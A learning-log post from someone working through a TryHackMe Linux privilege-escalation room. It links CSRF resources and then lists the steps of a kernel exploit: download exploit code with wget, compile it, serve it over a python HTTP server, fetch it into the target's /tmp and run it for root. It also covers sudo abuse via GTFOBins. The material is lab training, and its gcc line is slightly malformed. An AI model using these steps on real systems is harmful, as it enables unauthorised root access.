🎯 Day 9 Task


✅ CSRF Video


https://www.youtube.com/watch?v=iyE9UsBF64w

✅ POC


https://www.youtube.com/watch?v=TGJ4I-F5LhE


https://www.youtube.com/watch?v=YPnejsLPfVk


https://www.youtube.com/watch?v=gBdiKqNPQS8


https://www.youtube.com/watch?v=5jHIUTEdpvI



✅ CSRF Writeup 


https://infosecwriteups.com/understanding-exploiting-cross-site-request-forgery-csrf-vulnerabilities-935952375b71


https://huntr.dev/bounties/f952af13-8042-457d-b8d8-bd338987dc02/


✅ Tweet 


https://twitter.com/rootxyash/status/1480126074994368512


https://twitter.com/mavericknerd/status/1214071332083658757


-----------------------------------------------------------------------------------
🔁 THM Room 


➡ Working on Linux PrivEsc Room


✅ Completed till Task 6 Privilege Escalation Sudo 


https://tryhackme.com/room/linprivesc


For more Info check out my Github Repo


https://github.com/Imran407704/Learn365/


Some Tips :

The Kernel exploit methodology is simple :

1. Identify the kernel version
2. Search and find an exploit code for the kernel version of the target system
3. Run the exploit

Remember that: a failed kernel exploit can lead to a system crash :P

The Sudo exploit methodology :

1. First check how many programs normal user run with sudo rights -: sudo -l
2. go to https://gtfobins.github.io & search the binary file which have sudo rights  
3. Paste that Command & You are Root User :)


 Some Keywords : 
 
 
 ----------------------------------------------------------------------------------------------
| local system = my computer                                                                   |
| EXPL_FILE = Name of that Particular Exploit                                                  |
| IP:PORT = VPN IP (If you are on tryhackme) / local system IP:jo port se http server bana tha 
| - (hypen) = hypen ke baad command hai :) 
 ----------------------------------------------------------------------------------------------
 
My Steps for Kernel Exploit 

1. Exploit ko local system me - wget https://www.exploit-db.com/exploits/EXPL_FILE se download kiya  
2. gcc se complile kiya - gcc 12345.c exploit 
3. local system me http server banaya - sudo python3 -m http.server
4. & Then target machine ke tmp (temp) directory me jaana hai bcoz yehi directory aisi hai jisme hamey write ki permission hai mai ne home directory me bhi check kiya but waha par exploit ko local machine se transfer nhi kar pa rha tha - wget http://IP:PORT/exploit (remember that http use karna hai not https )
5. ./exploit 
ROOT User :)


My Steps for Sudo Exploit 
1. First check how many programs normal user run with sudo rights - sudo -l
2. go to https://gtfobins.github.io & search the binary file which have sudo rights  

------------------------------------------------------------------------------------------------------------------------------------------------------

#bugbounty #privesc #infosec #learn365
